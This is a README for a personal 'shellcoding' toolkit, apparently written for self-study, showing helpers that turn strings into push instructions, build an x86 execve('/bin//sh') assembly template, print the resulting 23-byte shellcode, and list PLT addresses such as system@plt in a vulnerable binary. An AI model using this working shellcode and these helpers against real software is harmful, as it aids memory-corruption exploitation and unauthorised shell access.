# shellcoding
Just a collection of scripts to help out with basic custom shellcoding.  For educational purposes, created with intention of teaching myself assembly a bit more every day.  

- Plans to integrate everything together in the future and pipe to cfuzz.

- Encoding coming eventually? 

##Stringhex
    root@kali:~/shellcoding# stringhex /bin//sh

    Hex for string '/bin//sh' is: \x68\x73\x2F\x2F\x6E\x69\x62\x2F

    //sh: push 0x68732f2f

    /bin: push 0x6e69622f

    [**] Copy and paste the below directly into the .asm.

        push 0x68732f2f

        push 0x6e69622f

##Newasm
    root@kali:~/shellcoding# newasm test

    root@kali:~/shellcoding# cat test.asm

    global _start

    _start:

        xor eax, eax

        push eax

        ;add your payload here

        push 0x68732f2f

        push 0x6e69622f
####The 2 pushes above we added from stringhex /bin//sh
        mov ebx, esp

        push eax

        ;add your additional argument here

        ;mov ecx, esp

        ;push eax

        ;push ecx

        push ebx

        mov ecx, esp

        mov al, 11

        int 0x80
####If we wanted to add arguments (for example for a /bin/cat shellcode) you'd simply add the argument right after it says ";add your additional argument here" and uncomment the 3 lines after it.


##Chex
    root@kali:~/shellcoding# chex test

    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

    Shellcode is 23 bytes long

    root@kali:~/shellcoding# ./test

    # id
    
    uid=0(root) gid=0(root) groups=0(root)

####This automatically compiles your asm file, generates some hex, and gives you the length.

##Plt
    root@kali:~# plt vuln -f system

    1 PLT(s) found.

    \x80\x83\x04\x08 <system@plt>

    root@kali:~# plt vuln

    8 PLT(s) found.

    \xb0\x83\x04\x08 <putchar@plt+0x10>

    \x90\x83\x04\x08 <__libc_start_main@plt>

    \x60\x83\x04\x08 <strcpy@plt>

    \x70\x83\x04\x08 <puts@plt>

    \x50\x83\x04\x08 <printf@plt>

    \x50\x83\x04\x08 <printf@plt>

    \xa0\x83\x04\x08 <putchar@plt>

    \x80\x83\x04\x08 <system@plt>


####Quickly finds plts.

